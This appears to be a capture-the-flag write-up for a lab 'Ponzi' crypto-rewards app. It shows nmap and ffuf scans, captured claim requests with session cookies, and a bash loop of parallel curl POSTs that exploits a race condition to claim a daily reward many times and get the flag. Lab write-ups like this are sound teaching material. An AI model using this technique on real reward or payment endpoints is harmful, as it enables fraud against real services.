@@ -1,0 +1,90 @@
+POST /claim HTTP/1.1
+Host: 10.49.184.31:3000
+Content-Length: 0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+Accept: */*
+Sec-GPC: 1
+Accept-Language: en-GB,en;q=0.7
+Origin: http://10.49.184.31:3000
+Referer: http://10.49.184.31:3000/dashboard
+Accept-Encoding: gzip, deflate, br
+Cookie: connect.sid=s%3AgE83Tfmn2WL0P7h3_O-kg21Sjv9_v8Rh.QgcJ%2BQ84dU2TTd9Kb61INLJg7iKSTGGY8gFFxGZZEII
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 115
+ETag: W/"73-Vg863zqod1OjOETK2Avxx3sTfMw"
+Date: Tue, 04 Aug 2026 14:25:14 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"message":"Staking reward claimed successfully.","reward":50,"newBalance":1500,"tier":"Whale","priceSnapshot":4.2}
+"message":"Welcome to the Whale Vault.","flag":"THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}","balance":1700}
+Ponzi set his towel down for one 24-hour reward claim. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.
+
+Concierge Briefing
+Ponzi found the resort's wellness portal running a little side project called Ponzi — a crypto rewards app, poolside edition. He set his towel down, claimed his daily reward, and went to reapply sunscreen. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.
+
+He's convinced the app owes him a spot in the Whale Vault. The app disagrees, politely, once every 24 hours. Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through.
+
+Steps
+Nmap scan shows us just a web app running on port 3000
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 16:e9:0d:2d:7b:66:ff:55:1b:cf:83:b0:69:b3:f4:6b (ECDSA)
+|_  256 d2:9b:e2:78:54:23:8c:26:08:34:7a:48:87:6a:75:f8 (ED25519)
+3000/tcp open  http    Node.js Express framework
+| http-title: Ponzi Portfolio \xE2\x80\x94 Login
+|_Requested resource was /auth/login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+After creating an account and checking the 'claim' button, it gives us 50 balance and we can't hit it again until 24 hours later. We need to get into 'vault' in order to get the flag but we cannot get in vault until our balance is over 150 and/or our tier is Whale
+
+ffuf with a valid session cookie
+
+ffuf -u http://10.64.184.22:3000/FUZZ -b 'connect.sid=s%3ABVS0Jr9m5K740m9nabuxgZ758-CN3Zui.CXiqjlwJK3o3T0SAtdH5JxF7RG62m5laxbbZzVhNWdA' \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404 -t 20
+All i found were dashboard and vault, which we already know.
+
+I created a new user to test what burp displays when trying to send the 'claim'.
+
+POST /claim HTTP/1.1
+Host: 10.64.184.22:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.64.184.22:3000/dashboard
+Origin: http://10.64.184.22:3000
+DNT: 1
+Connection: keep-alive
+Cookie: connect.sid=s%3AU7-BjQfCDzHVmHe0kowb2qp9ndKivO40.6WYKIRxnI4FpGmEl0wVkk0rLC4J0IqQ5Z6Q2lYRka8U
+Priority: u=0
+Content-Length: 0
+and this was the response
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 114
+ETag: W/"72-f8wsWDsVt6SP3811+HTqkwdvhHU"
+Date: Mon, 03 Aug 2026 16:31:17 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"message":"Staking reward claimed successfully.","reward":50,"newBalance":50,"tier":"Shrimp","priceSnapshot":4.2}
+The content-length is 0 on the POST, so its not even sending any balance updates or tier statuses, so it doesn't matter what we try sending it. It's something on the server that just marks claimed so this seems like its most likely a race condition
+
+I created a new user and got the new cookie, but didn't hit claim
+
+COOKIE='connect.sid=s%3AUfN7L1V7zjGTW1AoKgjhJfIjsn6aDqrc.W%2Fj54%2BfutzDBoZiWtspzUTPl1vdEptuz0H9CgQlkF9A'
+Then we can run a for loop that will send 20 quick 'claims'
+
+for i in $(seq 1 20); do
+  curl -s -o /dev/null -X POST http://10.64.184.22:3000/claim -b "$COOKIE" &
+done
+wait
+Now if we check our balance on the page, its up to 350 and we can click vault to get the flag
